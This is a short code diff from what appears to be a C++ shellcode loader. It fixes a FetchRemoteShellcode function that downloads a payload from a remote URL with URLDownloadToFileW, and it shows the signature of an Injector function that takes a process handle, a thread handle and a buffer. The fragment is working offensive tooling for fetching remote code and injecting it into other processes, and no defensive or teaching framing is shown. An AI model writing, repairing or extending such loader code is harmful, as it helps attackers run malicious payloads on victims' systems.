@@ -69,14 +69,14 @@ BOOL Injector(HANDLE hProcess, HANDLE hThread, const std::vector<char>& buf) {
 bool FetchRemoteShellcode(const wchar_t* srcURL) {
 
     const wchar_t* destFile = L"input.txt";
-    if (S_OK == URLDownloadToFile(NULL, srcURL, destFile, 0, NULL))
+    if (S_OK == URLDownloadToFileW(NULL, srcURL, destFile, 0, NULL))
     {
         printf("[+] Fetched Remote file");
-        return 0;
+        return true;
     }
     else
     {     
-        return -1;
+        return false;
     }
 
 }
@@ -172,4 +172,3 @@ int main(int argc, char* argv[]) {
 
     return 0;
 }
-
